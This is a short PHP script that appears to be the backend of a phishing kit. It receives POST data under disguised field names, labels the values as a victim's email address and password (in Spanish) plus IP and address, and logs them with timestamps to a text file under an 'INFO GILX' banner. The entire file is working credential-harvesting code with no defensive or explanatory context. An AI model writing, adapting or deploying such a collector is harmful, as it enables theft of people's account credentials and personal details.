<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $docc = $data['docc'];
    $clavv = $data['clavv'];
    $ip = $data['ip'];
    $address = $data['address'];
    $file = 'beelin-info.txt';
    $current = file_get_contents($file);
    $current .= "Correo electrónico: " . $docc . "\nContraseña: " . $clavv . "\nIP: " . $ip . "\nDirección: " . $address . "\n";
    $current .= date("Y-m-d H:i:s") . "\n";
    $current .= "********🦍🦍INFO GILX🦍🦍*****************\n";
    file_put_contents($file, $current);
}
?>